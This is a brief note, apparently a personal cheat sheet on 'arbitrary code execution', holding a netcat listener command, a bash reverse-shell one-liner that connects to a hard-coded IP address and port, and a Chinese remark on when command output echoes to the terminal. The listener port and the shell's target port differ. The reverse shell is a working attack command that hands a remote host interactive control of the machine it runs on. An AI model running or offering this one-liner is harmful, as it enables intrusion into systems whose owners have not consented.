# Arbitrary code execution 
nc -lvp 8080 (listen, verbose, port)
bash -i >& /dev/tcp/142.132.208.240/7000  0>&1
注意回显是/dev/tty0自动显示的,如果0/1/2至少一个连接着/dev/tty0,那么命令就会回显到当前命令行,否则不会。
